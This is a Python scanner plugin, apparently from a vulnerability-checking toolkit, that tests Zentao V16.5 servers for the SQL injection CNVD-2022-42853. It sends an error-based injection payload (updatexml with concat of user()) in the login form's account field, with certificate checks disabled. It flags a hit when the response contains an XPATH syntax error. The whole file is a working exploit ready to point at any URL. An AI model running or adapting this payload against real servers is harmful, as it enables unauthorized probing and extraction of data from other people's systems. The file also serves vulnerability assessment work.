#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/vJb_bZc4obJy4dgekDO-2Q',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '禅道V16.5SQL注入 CNVD-2022-42853',

      'level'     :   'high',
      'FOFA'      :   '',
      'author'    :   'ppxfx',
      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      "Accept": "application/json, text/javascript, */*; q=0.01",
      "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
      "Accept-Encoding": "gzip, deflate",
      "Referer": "",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest",
      "Connection": "close", "Sec-Fetch-Site": "same-origin",
      }
  target = '/zentao/user-login.html'
  data = '''
  data={"account":"admin' and  updatexml(1,concat(0x1,user()),1) and '1'='1","password":"65270be4586bc80a9472e4b215c6007c","passwordStrength":0,"referer":"%2Fzentao%2F","verifyRand":1077955870,"keepLogin":0,"captcha":""}

  '''
  url1 = url + target
  ret['url'] = url1
  headers['Referer'] = url + '/zentao/user-login-L3plbnRhby8=.html'
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if "XPATH syntax error" in res.text:
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret